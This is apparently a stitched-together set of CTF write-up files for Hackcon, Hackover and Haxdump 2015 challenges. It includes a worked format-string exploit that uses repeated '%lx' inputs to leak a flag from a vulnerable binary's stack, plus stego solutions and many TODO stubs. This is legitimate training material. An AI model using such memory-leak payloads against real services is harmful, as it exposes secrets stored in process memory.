
Keywords:

* Format String `fs`
* Difficulty: `beginner`

We are given a x86-64bit non-stripped ELF for Linux:

```bash
$ file pwnie
pwnie: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=b87bef02278df740b6c0011e989f39b08ccfc998, not stripped
```

Running it:

```bash
$ ./pwnie
No!
```

`ltrace -f`:

```bash
$ ltrace -f ./pwnie 
[pid 3161] __libc_start_main(0x4006c0, 1, 0x7fff95c96be8, 0x4008b0 <unfinished ...>
[pid 3161] fopen("flag.txt", "r")                     = 0
[pid 3161] puts("No!"No!
)                                = 4
[pid 3161] fflush(0x7f5b83ac7400)                     = 0
[pid 3161] +++ exited (status 255) +++
```

Looks like we have to provide a flag file named `flag.txt` with a flag in it: `echo 'flag{thisisatestflag}' > flag.txt`

Running it again:

```bash
$ ./pwnie 
hello?
Did you say: 
hello?
```

It echos back whatever we are saying!

Trying a Stack Buffer Overflow:

```bash
$ p -c 'print "A"*0x200' | ./pwnie 
Did you say: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$
$ echo -n AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | wc
      0       1      99
```

Looks like we can't smash the stack and only provide up to `99`/`100` bytes of input.

We try to verify this again with `ltrace -f`:

```bash
$ ltrace -f ./pwnie 
[pid 3172] __libc_start_main(0x4006c0, 1, 0x7fff475ce218, 0x4008b0 <unfinished ...>
[pid 3172] fopen("flag.txt", "r")                     = 0xc6e010
[pid 3172] fgets("flag{thisisatestflag}\n", 100, 0xc6e010) = 0x7fff475ce060
[pid 3172] fgets(hello
"hello\n", 100, 0x7f51d851e640)      = 0x7fff475ce0c4
[pid 3172] strncmp("hello\n", "flag{thisisatestflag}\n", 10) = 2
[pid 3172] puts("Did you say: "Did you say: 
)                      = 14
[pid 3172] fflush(0x7f51d851e400)                     = 0
[pid 3172] __printf_chk(1, 0x7fff475ce0c4, 0, -1hello
)     = 6
[pid 3172] fflush(0x7f51d851e400)                     = 0
[pid 3172] +++ exited (status 0) +++
```

We see a `fopen` on our flag file and a `fgets` that reads the flag into the stack at `0x7fff475ce060`.

Afterwards, [`__printf_chk()`](http://refspecs.linuxbase.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/libc---printf-chk-1.html) is called, with the second argument being the format string.

This smells like a format string vulnerability!

Let's test it:

```bash
$ p -c 'print "%x."*0x10' | ./pwnie
Did you say: 
0.ffffffff.bde88740.0.67616c66.61736973.67616c66.0.0.0.0.bdeac520.789e91b0.789e91a0.f63d4e2e.400436.
```

We can see that after providing several `%x` (read e.g. [here](https://www.exploit-db.com/docs/28476.pdf) how format string exploits work), several lower-case words in hexadecimal from the stack are printed.

Since we are dealing with `64`bit, our words are long words, we provide the long hex format `%lx`:

```bash
$ p -c 'print "%lx."*0x10' | ./pwnie 
Did you say: 
0.ffffffffffffffff.7fe653ab0740.0.6968747b67616c66.7473657461736973.a7d67616c66.0.0.0.0.7fe653ad4520.7fffab9a88a0.7fffab9a8890.f63d4e2e.400436.
```

If you look at the `5th` and `6th` long word, you can see hexadecimal output, which is human readable if converted to ASCII.

[This python script](./format-dump.py) dumps all long words considering little-endianess and zero-padding to the screen, which we then pipe to `xxd` to convert to binary.

Since the flag is stored on the stack, we should see the flag if we provide enough long words formats.

```bash
$ p format-dump.py 50 | xxd -r -p | xxd
0000000: 0000 0000 0000 0000 ffff ffff ffff ffff  ................
0000010: 40e7 e61b 4a7f 0000 0000 0000 0000 0000  @...J...........
0000020: 666c 6167 7b74 6869 7369 7361 7465 7374  flag{thisisatest
0000030: 666c 6167 7d0a 0000 0000 0000 0000 0000  flag}...........
0000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000050: 0000 0000 0000 0000 2025 e91b 4a7f 0000  ........ %..J...
0000060: 9046 864c ff7f 0000 8046 864c ff7f 0000  .F.L.....F.L....
0000070: 2e4e 3df6 0000 0000 3604 4000 0000 0000  .N=.....6.@.....
0000080: ffff ffff 256c 782e 256c 782e 256c 782e  ....%lx.%lx.%lx.
0000090: 256c 782e 256c 782e 256c 782e 256c 782e  %lx.%lx.%lx.%lx.
00000a0: 256c 782e 256c 782e 256c 782e 256c 782e  %lx.%lx.%lx.%lx.
00000b0: 256c 782e 256c 782e 256c 782e 256c 782e  %lx.%lx.%lx.%lx.
```

We can clearly see the flag in the ASCII representation column of `xxd`.

If we test it on the remote server, we get the real flag, `FORMAT(str)`:

```bash
$ p format-dump.py 50 | xxd -r -p | xxd
0000000: 0000 0000 0000 0000 ffff ffff ffff ffff  ................
0000010: 4057 0b81 f67f 0000 0000 0000 0000 0000  @W..............
0000020: 464f 524d 4154 2873 7472 2900 f67f 0000  FORMAT(str).....
0000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000050: 0000 0000 0000 0000 2095 0d81 f67f 0000  ........ .......
0000060: 0077 0f93 ff7f 0000 f076 0f93 ff7f 0000  .w.......v......
0000070: 2e4e 3df6 0000 0000 3604 4000 0000 0000  .N=.....6.@.....
0000080: ffff ffff 256c 782e 256c 782e 256c 782e  ....%lx.%lx.%lx.
0000090: 256c 782e 256c 782e 256c 782e 256c 782e  %lx.%lx.%lx.%lx.
00000a0: 256c 782e 256c 782e 256c 782e 256c 782e  %lx.%lx.%lx.%lx.
00000b0: 256c 782e 256c 782e 256c 782e 256c 782e  %lx.%lx.%lx.%lx.
```

## Other write-ups and resources

 <http://vimvaders.github.io/hackcon2015/2015/08/20/did-you-mean.html>
# Hackcon 2015: Making Love To Bugs

**Category:** Pwnage
**Points:** 25
**Author:** [Aneesh Dogra](https://github.com/lionaneesh)
**Difficulty:** Easy
**Description:** 

Get your flag [here](ilovebugs.pyc).

## Write-up

(TODO)

## Other write-ups and resources

* <http://vimvaders.github.io/hackcon2015/2015/08/20/making-love-to-bugs.html>
# Hackcon 2015: Pythonista

**Category:** Pwnage
**Points:** 25
**Author:** [Sambhav Satija](https://github.com/darkryder)
**Difficulty:** Easy
**Description:** 

The program apparently once could print more than stories.

## Write-up

(TODO)

## Other write-ups and resources

* <http://vimvaders.github.io/hackcon2015/2015/08/20/pythonista.html>
# hackcon15 write-ups

* [Website](http://hackcon.in/)
* [Scoreboard](scoreboard.json)

## Completed write-ups

* [forensics/WatchMeSurfTheInternet](forensics/WatchMeSurfTheInternet)
* [pwnage/DidYouMean](pwnage/DidYouMean)

## External write-ups only

* [binary/AndSoOn](binary/AndSoOn)
* [binary/LetsLearnDebugging](binary/LetsLearnDebugging)
* [crypto/IdLoveToTurnYouOn](crypto/IdLoveToTurnYouOn)
* [crypto/StealTheDiamond](crypto/StealTheDiamond)
* [misc/FragG](misc/FragG)
* [misc/NinjaTurtles](misc/NinjaTurtles)
* [misc/SurpriseModafocka](misc/SurpriseModafocka)
* [pwnage/MakingLoveToBugs](pwnage/MakingLoveToBugs)
* [pwnage/Pythonista](pwnage/Pythonista)
* [web/DoctorDoctor](web/DoctorDoctor)

## Missing write-ups# Hackcon 2015: Doctor Doctor

**Category:** Web
**Points:** 25
**Author:** [Mayank Vachher](https://github.com/mvachher)
**Difficulty:** Easy
**Description:** 

Flag is [here](http://hackcon.in:8080/level8/)

## Write-up

(TODO)

## Other write-ups and resources

* <http://vimvaders.github.io/hackcon2015/2015/08/20/doctor-doctor.html>
# Hackover CTF 2015: fuckaduck

**Category:** Crypto
**Points:** 400
**Solves:** 4
**Description:**

> My [SSH key](./id_rsa) doesn't work anymore :-(
> 
> ssh fuckaduck@fuckaduck.hackover.h4q.it
> 
> Hint: There is at most one thing you wouldn't expect.
> 
> Another hint: e, iqmp, dmp1, dmq1 are ok. If some value seems weird, it's not ok.
> 
> Final hint: Use a special case of the CRT and the modulo definition. Can't be that difficult, it's just a little math.
> 
> Don't be confused by a few bits


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hackover CTF 2015: nodistinguisher

**Category:** Crypto
**Points:** 100
**Solves:** 44
**Description:**

> Want to encrypt your messages? Try our encryption service:
> 
> nc nodistinguisher.hackover.h4q.it 1415
> 
> Hint: The author likes base32 more than base64 ...
> 
> Another hint: PKCS7 is involved.
> 
> Come on, I want to see at least 30% being able to solve this. So look at the source code [nodistinguisher-d1f5e7a4e4206a3ad54cffcde35b975c.go](./nodistinguisher-d1f5e7a4e4206a3ad54cffcde35b975c.go).


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/SuperVirus/CTF/blob/master/2015/Hackover_CTF_2015/crypto/100-nodistinguisher/nodistinguisher.py>
# Hackover CTF 2015: racer

**Category:** Crypto
**Points:** 300
**Solves:** 7
**Description:**

> Join the [race](http://racer.hackover.h4q.it:8202/) and make a round. Don't forget to view the winner animation!
> 
> Hint: Just distinguish it from random data.
> 
> Another hint: Accuracy not good enough? Get more pills!
> 
> Yet another hint: Get the binary. [racer-binary-c33892f7d4b3b130d1bf279f03423784.tgz](./racer-binary-c33892f7d4b3b130d1bf279f03423784.tgz)
> 
> Still not solved ... get the source code [racer-213a46f1ff5ab4bae753b270409e9b76.go](./racer-213a46f1ff5ab4bae753b270409e9b76.go)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/dqi/ctf_writeup/tree/master/2015/hackover/crypto/racer>
# Hackover CTF 2015: radorium

**Category:** Crypto
**Points:** 200
**Solves:** 24
**Description:**

> We received a [message](./message.txt) from our bribed spy.
> 
> ssh r7@radorium.hackover.h4q.it


## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://shiho-elliptic.tumblr.com/post/131418250144/hackover-ctf-2015-writeup)
# Hackover CTF 2015: yodigga

**Category:** Crypto
**Points:** 24
**Solves:** 500
**Description:**

> Watch out for trolls, they bite.
> 
> nc yodigga.hackover.h4q.it 1342


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ufologists/write-ups/tree/master/hackover15/crypto>
* <https://0x90r00t.com/2015/10/19/hackover-2015-crypto-500-yodigga-write-up/>
* <https://github.com/janglapuk/ctf-writeup/tree/master/2015/hackover/crypto/yodigga>
* [Japanese](http://shiho-elliptic.tumblr.com/post/131418250144/hackover-ctf-2015-writeup)
# Hackover CTF 2015: alienmessage

**Category:** Forensics
**Points:** 400
**Solves:** 1
**Description:**

> As you guys might know, SETI is still listening up there for signs of extra-
> 
> terrestrial life. 
> 
> It turns out, they received something a few days ago and since it sounded like 
> 
> an old chiptune, gave it to us...
> 
> We want to believe - are they out there? What do they want?
> 
> /web.hackover.h4q.it/[alienmessage-a844ca7f1894e15fce0ce5d82b31ff0a.tgz](./alienmessage-a844ca7f1894e15fce0ce5d82b31ff0a.tgz)
> 
> Hint: There is more than the just a spatial domain.
> 
> Hint2: SETI suggests to look at the frequency domain, maybe the signal is digital after all?


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hackover CTF 2015: invisible1337

**Category:** Forensics
**Points:** 200
**Solves:** 26
**Description:**

> Just an empty image, we cant see any flag here... where might it be?
> 
> /web.hackover.h4q.it/[invisible1337-3ad7a81b0f4dbd6c42cf71312031502c.tgz](./invisible1337-3ad7a81b0f4dbd6c42cf71312031502c.tgz)
> 
> Hint: You are probably not blind.
> 
> Hint2: BLIND TOUCH.
> 
> Hint3: cat flag | wc --bytes
> 
> 39


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on following writeups:

* [Japanese](http://encry1024.hatenablog.com/entry/2015/10/19/092015)
* <http://pastebin.com/PzPh3iEV>

We are given a gziped compressed tar archived, which we decompress using `tar xvf invisible1337-3ad7a81b0f4dbd6c42cf71312031502c.tgz` to get a PNG named `invisible1337.png`.

The picture is of size 1337 bytes and at first glance appears to be a blank picture:

![](./invisible1337.png)

Using `stegsolve`, we see a hidden QR code in the Colour inversion mode:

![](./stegsolve.bmp)

We submit the QR code to an [online qr code decoder](https://zxing.org/w/decode.jspx) to receive following text and morsecode:

    murrrmurrrmurrr :3 touch me! touch me! touch me! - .... .. ... / .. ... / -. --- - / - .... . / ..-. .-.. .- --. --..-- / -... ..- - / -.-. --- --- .-.. / --- ..-. / -.-- --- ..- / .- -. -.-- .-- .- -.-- / -.- . . .--. / ... . .- .-. -.-. .... .. -. --.

If we submit the morsecode to an online [morse code decoder](https://gc.de/gc/morse/), we get `this_is_not_the_flag,_but_cool_of_you_anyway_keep_searching` - Seems like a dead-end.

However, the text `touch me! touch me! touch me!` is a hint that the flag is encoded as [Braille ASCII](https://en.wikipedia.org/wiki/Braille_ASCII).

[This python script](./invisible1337.py) attempts to decode the hidden Braille code into ASCII to get the following:

    w#^azjjrfxjsfm'x#^^wwx#^!qv.^rqt.jrnzqpwjcu!'m''.cbehih,de,fehd,aga,gjbchebhackover#ae?iamahiddenflagaskmey?-.!'^--,,,svt!l!^u,ud.-#fsetl.plaryyuw-zqaxrmgw^i'mwxxv,y!km-nkacgtxhgtr.qdtbrfnxjw,ku^ku^?qdt.ytswkq'bijfcaichce^dtmgcrizrwesc?zhezba?r!.#aq'jnlvqwh#kmvnxguuwvn.eprnncjafjh.jmniz.#w'pg.vp#jv#dvw#f-okow#npimw#s^khfp^#?!-p'vpkocrkbqavkwsscn#qp#i#meemv!oijgppo.gerlmqmu.pfy-fphcps'!y#s,bf^rc^qb?hxqfgoegqxvm^aq-zbs-dc-dhhx-fayiujrxp.tgnvnn!jx#xi?-s.jvfroh.x

We see the strings `hackover` and `iamahiddenflag`.

Since this writeup is based on other writeups and I cannot confirm the correct flag, except its size (see the last hint in the task description), I assume that the flag is `hackover#ae?iamahiddenflagaskmey?-.!'^`.

Maybe the decoding is still wrong or other parts of the flag are encoded in other values except the red values (`pix[x,y][0]`) of the given picture.

## Other write-ups and resources

* [Japanese](http://encry1024.hatenablog.com/entry/2015/10/19/092015)
* <http://pastebin.com/PzPh3iEV>
# Hackover CTF 2015: meargot

**Category:** Forensics
**Points:** 300
**Solves:** 3
**Description:**

> Dear Mr.Smith,
> 
> i found this file on a old computer from my dad.
> 
> He used to hunt aliens, but never found a lot ...
> 
> Anyway this file was hidden deep in the system so maybe its interesting?!
> 
> Could you analyze the data? If you find anything pls send it directly to the nasa.
> 
> My father holds an account for E.T.-Activity.
> 
> Greetings
> 
> Mr. Smith
> 
> Simply pack any information as hackover15{info} 
> 
> /web.hackover.h4q.it/[meargot-edbdef07f6dfa4a3273dca6df7282a97.tar](./meargot-edbdef07f6dfa4a3273dca6df7282a97.tar)
> 
> Hint: Hello? Heeellloooo? Can you hear me?
> 
> Hint2: My father was a gamer. He always loved a play
> 
> Hint3: My father was a spec op. He even trained in NATO...


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hackover CTF 2015: pinkie-pie

**Category:** Forensics
**Points:** 50
**Solves:** 
**Description:**

> Cause cheering up my friends is just what Pinkie's here to do
> 
> Duo to a error, the following link got updated: 
> 
> /web.hackover.h4q.it/[pinkie-pie-f005c9e9e585a3968c82c7f0df821802.tgz](./pinkie-pie-f005c9e9e585a3968c82c7f0df821802.tgz)


## Write-up

by [polym](https://github.com/abpolym)

We are given a gzip compressed tar archive that we uncompress with `tar xvf pinkie-pie-f005c9e9e585a3968c82c7f0df821802.tgz` to find a png that only shows pink.

Applying `stegsolve` with a random colour map yields a hidden flag:

![](./stegsolve-random.png)

The flag is `hackover15{pInKie_pIe_LoVeS_pArTy}`.

## Other write-ups and resources

* <https://614ckc0de.wordpress.com/2015/10/23/writeup-hackover-ctf-2015/>
* [Indonesian](http://osslovers.blogspot.de/2015/10/write-up-hack-over-2015-pinkie-pie.html)
# Hackover CTF 2015: allyourbase

**Category:** Misc
**Points:** 20
**Solves:** 304
**Description:**

> All your base are belong to us! You have no chance to decode make your time.
> 
> SGVsbG8gbXkgZnJpZW5kLiBUaGlzIGlzIGJhc2U2NC4gQXgeW91IHNlZSwgaXQgaXMgYnJv
> a2VuLiDYW4geW91IHJlY292ZXIgdGhlIGZvbGxvd2luZBmbGFnOioYWNrb3ZlcjE1e21pc
> 2FsaWduZWRCaXRzQnJlYWtCYXNlNjR9


## Write-up

(TODO)

## Other write-ups and resources

* <https://614ckc0de.wordpress.com/2015/10/23/writeup-hackover-ctf-2015/>
# Hackover CTF 2015: ctfbeer

**Category:** Misc
**Points:** 300
**Solves:** 4
**Description:**

> Hey friend,
> 
> its Frank from the FBI ....
> 
> There is a new gang in the city.
> 
> We finnaly hacked into one of their server and got a few files.
> 
> But we have no clue what this data should mean.
> 
> Could you pls take a look?
> 
> greetz
> 
> Frank
> 
> P.S. we have a little problem with our legacycode so if you want to sent me a MESSAGE, send it as hackover15{MESSAGE} 
> 
> /web.hackover.h4q.it/[ctfbeer-4cb93d0280aa14b98b59615d2643dbf4.tar](./ctfbeer-4cb93d0280aa14b98b59615d2643dbf4.tar)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hackover CTF 2015: dna

**Category:** Misc
**Points:** 200
**Solves:** 16
**Description:**

> DNA encodes information.
> 
> Normally it's biological, but this time it's binary.
> 
> /web.hackover.h4q.it/[dna-foo.fasta-148059e47b2dacda5db3709977587693.tgz](./dna-foo.fasta-148059e47b2dacda5db3709977587693.tgz)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hackover CTF 2015: greetings

**Category:** Misc
**Points:** 1
**Solves:** 407
**Description:**

> Welcome to Hackover CTF 2015! Here is your first flag: hackover15{ready2hack}


## Write-up

The flag is `hackover15{ready2hack}`.

## Other write-ups and resources

* none yet
# Hackover CTF 2015: simplepassword

**Category:** Misc
**Points:** 100
**Solves:** 91
**Description:**

> SUCH SECURE. VERY PASSWORD. MUCH HACKING. ^o^
> 
> nc simplepassword.hackover.h4q.it 1337 
> 
> Hint for stage 1: The Plague: the four most-used passwords are...
> 
> UP AND RUNNING: nc 46.101.136.193 1337


## Write-up

(TODO)

## Other write-ups and resources

* <https://0x90r00t.com/2015/10/27/hackover-2015-misc-100-simple-password-write-up/>
# Hackover CTF 2015: ascii-painter

**Category:** Pwn
**Points:** 150
**Solves:** 5
**Description:**

> Do you like fancy graphics?
> 
> Prove your drawing skills!
> 
> Debian 8 x86_64 with 32bit multilib (Linux 3.16.0-4-amd64) 
> 
> /web.hackover.h4q.it/[ascii-painter-57b6e098f20f16a889b6d462ac27b755.tgz](./ascii-painter-57b6e098f20f16a889b6d462ac27b755.tgz)
> 
> nc ascii-painter.hackover.h4q.it 1337 
> 
> Hint: want to paint bigger pictures? pass the boundary!


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hackover CTF 2015: brainplant

**Category:** Pwn
**Points:** 300
**Solves:** 5
**Description:**

> Brainplant 0.13.37 alpha - a power plant configuration tool
> 
> 
> Brainplant (or brain) is a highly secure, fast and extensible configuration tool,
> 
> meant for use in power plants. Since a main requirement was to make use of an easily
> 
> readable and concise configuration language, Brainfuck seemed a reasonable choice.
> 
> However, it's still WIP - currently, the only functional part is the brainfuck
> 
> interpreter.
> 
> 
> Usage:
> 
> just connect to the IP and port (default: 1313) of the service and enter your
> 
> configuration program in the prompt, the output will be returned.
> 
> The maximum length for the program is 4096 characters, you can also terminate the
> 
> program using a null-byte.
> 
> 
> Example:
> 
> Send helloworld.bf, receive "Hello World!"
> 
> Fri Oct 16 20:58:04 CEST 2015:
> 
> - WARNING: Please redownload the tarball, the binary inside it was borked
> 
> 
> Fri Oct 16 21:51:38 UTC 2015:
> 
> Debian 8 x86_64 with 32bit multilib (Linux 3.16.0-4-amd64) 0b2056fc041e8d3922c4dc5ae41cf607 /lib/i386-linux-gnu/i686/cmov/libc-2.19.so
> 
> 
> Sat Oct 17 01:33:43 UTC 2015:
> 
> make sure to use brainplant2.hackover.h4q.it (46.101.249.202) 31337, the old host turned out to behave weird
> 
> 
> 
> /web.hackover.h4q.it/[brain-4bab49d431f87ea1632df6a045067419.tgz](./brain-4bab49d431f87ea1632df6a045067419.tgz)
> 
> 
> nc brainplant2.hackover.h4q.it 31337
> 
> OR
> 
> nc brainplant.hackover.h4q.it 31337


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hackover CTF 2015: easy-shell

**Category:** Pwn
**Points:** 75
**Solves:** 52
**Description:**

> Nom Nom, shell tastes goooood!
> 
> Fri Oct 16 23:13:31 UTC 2015:
> 
> WARNING: re-download, challenge got fixed and points increased to 75 because of the wasted time. sorry
> 
> 
> SETUP:
> 
> Debian 8 x86_64 with 32bit multilib (Linux 3.16.0-4-amd64) 
> 
> 
> /web.hackover.h4q.it/[easy_shell-2fdf5e4dea11c1e96f0a81971b096e48.tgz](./easy_shell-2fdf5e4dea11c1e96f0a81971b096e48.tgz)
> 
> 
> nc easy-shell.hackover.h4q.it 1337


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ByteBandits/writeups/blob/master/hackover-ctf-2015/pwn/easy-shell/sudhackar/README.md>
* <https://f00l.de/blog/hackover-ctf-2015-easy-shell/>
* <http://www.leakedin.com/2015/10/18/shellcode-291/>cA
* <https://nuc13us.wordpress.com/2015/10/19/hackoverctf-2015-easy-shell-75-exploitaion/>
* <http://rikaard.io/hackover-ctf-easyshell/>
* <http://pastebin.com/SWyyaXwn>
# Hackover CTF 2015: nodev

**Category:** Pwn
**Points:** 200
**Solves:** 6
**Description:**

> They gave me a SSH key [id_ed25519.txt](./id_ed25519.txt).
> 
> 
> ssh root@nodev.hackover.h4q.it
> 
> Hint: Take a look at the [binary](./nodev-5a29721c2f3fe140dc968f3e84381bce.tgz).
> 
> 
> Another hint: Did you see the file descriptor? Where does it point to?
> 
> 
> UP AGAIN: New IP: 46.101.199.202, waiting for DNS to propagate.


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hackover CTF 2015: unfortune

**Category:** Pwn
**Points:** 400
**Solves:** 2
**Description:**

> Seeing is believing.  You wouldn't have seen it if you hadn't believed it.
> 
> nc unfortune.hackover.h4q.it 1337


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Hackover CTF write-ups

* <https://ctf.hackover.de>
* [Scoreboard](https://ctf.hackover.de/ranking) or [local alternative](./scoreboard)

## Completed write-ups

* [forensics/invisible1337](forensics/invisible1337)
* [forensics/pinkie-pie](forensics/pinkie-pie)
* [misc/greetings](misc/greetings)

## External write-ups only

* [crypto/nodistinguisher](crypto/nodistinguisher)
* [crypto/racer](crypto/racer)
* [crypto/radorium](crypto/radorium)
* [crypto/yodigga](crypto/yodigga)
* [misc/allyourbase](misc/allyourbase)
* [misc/simplepassword](misc/simplepassword)
* [pwn/easy-shell](pwn/easy-shell)
* [reversing/easy-math](reversing/easy-math)
* [reversing/goto](reversing/goto)
* [reversing/i-like-to-move-it](reversing/i-like-to-move-it)
* [web/hack-the-planet](web/hack-the-planet)
* [web/messagecenter](web/messagecenter)
* [web/securelogin](web/securelogin)

## Missing write-ups

* [crypto/fuckaduck](crypto/fuckaduck)
* [forensics/alienmessage](forensics/alienmessage)
* [forensics/meargot](forensics/meargot)
* [misc/ctfbeer](misc/ctfbeer)
* [misc/dna](misc/dna)
* [pwn/ascii-painter](pwn/ascii-painter)
* [pwn/brainplant](pwn/brainplant)
* [pwn/nodev](pwn/nodev)
* [pwn/unfortune](pwn/unfortune)# Hackover CTF 2015: easy-math

**Category:** Reversing
**Points:** 50
**Solves:** 100
**Description:**

> A small warmup, show me that you know basic arithmetic
> 
> nc easymath.hackover.h4q.it 1337 
> 
> 
> /web.hackover.h4q.it/[easy_math-3389b83370c30874e25f2f7029938f07.tgz](./easy_math-3389b83370c30874e25f2f7029938f07.tgz)


## Write-up

(TODO)

## Other write-ups and resources

* <https://f00l.de/blog/hackover-ctf-2015-easy-math/>
# Hackover CTF 2015: goto

**Category:** Reversing
**Points:** 150
**Solves:** 83
**Description:**

> GOTO considered harmful. How much harm did it do? Can you retrieve the password?
> 
> /web.hackover.h4q.it/[goto-03661d1a42ad20065ef6bfbe5a06287c.tgz](./goto-03661d1a42ad20065ef6bfbe5a06287c.tgz)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ByteBandits/writeups/blob/master/hackover-ctf-2015/reverse/goto/sudhackar/README.md>
* <http://capturetheswag.blogspot.de/2015/10/hackover15-goto-150pt-reverse.html>
# Hackover CTF 2015: i-like-to-move-it

**Category:** Reversing
**Points:** 350
**Solves:** 11
**Description:**

> I like to move it, move it
> 
> I like to move it, move it
> 
> I like to move it, move it
> 
> You like to move it
> 
> /web.hackover.h4q.it/[move_it-8e63dd5da5dab99ebd2c483f6b9f3a5a.tgz](./move_it-8e63dd5da5dab99ebd2c483f6b9f3a5a.tgz)


## Write-up

(TODO)

## Other write-ups and resources

* <http://uaf.io/reverse%20engineering/2015/10/18/Hackover-RE-350-The-Ghetto-solution.html>
* <https://github.com/dqi/ctf_writeup/tree/master/2015/hackover/reversing/%20i-like-to-move-it>
# Hackover CTF 2015: hack-the-planet

**Category:** Web
**Points:** 50
**Solves:** 94
**Description:**

> Hacking a site is basic task for any skilled hacker.
> 
> Methods range from brute force to talking to people.
> 
> No matter which method you choose, don't forget to use head.
> 
> HINT: His question is the answer http://hack-the-planet.hackover.h4q.it
> 
> Hint: Someone censored the [source code](./hack-the-planet-275983b5101b4c089443f0486c6bfb03.go).


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/ByteBandits/writeups/blob/master/hackover-ctf-2015/web/hack-the-planet/sudhackar/README.md>
* <https://ctftime.org/writeup/1931>
# Hackover CTF 2015: messagecenter

**Category:** Web
**Points:** 100
**Solves:** 25
**Description:**

> Better than email! Use colors! And even more. [Try us](http://messagecenter.hackover.h4q.it/)!
> 
> 
> Hint: Do you like ugly PHP code /[messagecenter-2275ebdf3f310d7a86d712b732947292.tgz](./messagecenter-2275ebdf3f310d7a86d712b732947292.tgz)?.
> 
> 
> Hint: Do you like [memes](./65113994.jpg)?


## Write-up

(TODO)

## Other write-ups and resources

* <https://f00l.de/blog/hackover-ctf-2015-messagecenter/>
* <https://0x90r00t.com/2015/10/27/hackover-2015-web-100-message-center-write-up/>
# Hackover CTF 2015: securelogin

**Category:** Web
**Points:** 250
**Solves:** 16
**Description:**

> We have found a new portal that the NSA is beta-testing for their undercover agents.
> 
> They claim that it is totally secure and unbreakable, can you prove them wrong and steal the secret?
> 
> http://securelogin.hackover.h4q.it


## Write-up

(TODO)

## Other write-ups and resources

* <https://f00l.de/blog/hackover-ctf-2015-securelogin/>
# Haxdump CTF 2015: All of them?

**Category:** Crypto
**Points:** 50
**Solves:** 8
**Description:**

> 
> Find the flag!
> 
> Author: abuss
> 
> [50](./50)


## Write-up

(TODO)

## Other write-ups and resources

* <https://haxdump.com/static/crypto50.txt>
# Haxdump CTF 2015: Forget Salting and Ship It Anyway

**Category:** Crypto
**Points:** 300
**Solves:** 48
**Description:**

> 4c95f619e8daa2886630fbb298da8714
> 
> (aka the worst five letters on the planet)
> 
> 
> author: cfranks


## Write-up

(TODO)

## Other write-ups and resources

* <https://haxdump.com/static/Crypto300.pdf>
# Haxdump CTF 2015: handwritten

**Category:** Crypto
**Points:** 200
**Solves:** 1
**Description:**

> Decrypt the message!
> 
> 
> Hint: it looks like someone forgot to crop the photo correctly!
> 
> Hint 2: I took another photo in different lighting.
> 
> Hint 3: If you did it once, you can do it again!
> 
> Author: abuss
> 
> 
> [SRYLPEAG.jpg](./SRYLPEAG.jpg)
> 
> [LIEBYWT.jpg](./LIEBYWT.jpg)


## Write-up

(TODO)

## Other write-ups and resources

* <https://haxdump.com/static/crypto200.txt>
# Haxdump CTF 2015: More of them?

**Category:** Crypto
**Points:** 51
**Solves:** 6
**Description:**

> Find the flag!
> 
> 
> Author: abuss
> 
> 
> [51](./51)


## Write-up

(TODO)

## Other write-ups and resources

* <https://haxdump.com/static/crypto51.txt>
# Haxdump CTF 2015: Breadcrumbs

**Category:** Forensics
**Points:** 75
**Solves:** 41
**Description:**

> Find the flag!
> 
> 
> Author: cfranks
> 
> 
> [FORENSICS_250GIG.pcapng](./FORENSICS_250GIG.pcapng)


## Write-up

(TODO)

## Other write-ups and resources

* <https://haxdump.com/static/Forensics75.pdf>
# Haxdump CTF 2015: Moth 1337

**Category:** Forensics
**Points:** 100
**Solves:** 32
**Description:**

> Find the flag!
> 
> 
> Author: cfranks
> 
> 
> [Forensics100Updated.jpg](./Forensics100Updated.jpg)


## Write-up

(TODO)

## Other write-ups and resources

* <https://haxdump.com/static/Forensics100.pdf>
# Haxdump CTF 2015: newtoy

**Category:** Forensics
**Points:** 200
**Solves:** 1
**Description:**

> Find the flag!
> 
> 
> Hint: I just got a new __ and want to try it out! I need something first though...
> 
> 
> Author: abuss
> 
> 
> [newtoy.pcap](./newtoy.pcap)


## Write-up

(TODO)

## Other write-ups and resources

* <https://haxdump.com/static/forensics200.txt>
# Haxdump CTF 2015: oops

**Category:** Forensics
**Points:** 250
**Solves:** 8
**Description:**

> Find the flag!
> 
> 
> (It might have been damaged in transit. Sorry, and good luck!)
> 
> 
> Author: abuss
> 
> 
> [flags.tar](./flags.tar)


## Write-up

(TODO)

## Other write-ups and resources

* <https://haxdump.com/static/forensics250.txt>
# Haxdump CTF 2015: Tom Beale Had The Right Idea

**Category:** Forensics
**Points:** 150
**Solves:** 4
**Description:**

> 
> Find the flag!
> 
> 
> author: cfranks
> 
> 
> [FORENSICS150.jpg](./FORENSICS150.jpg)


## Write-up

(TODO)

## Other write-ups and resources

* <https://haxdump.com/static/Forensics150.pdf>
# Haxdump CTF 2015: NIH

**Category:** Pwn
**Points:** 150
**Solves:** 15
**Description:**

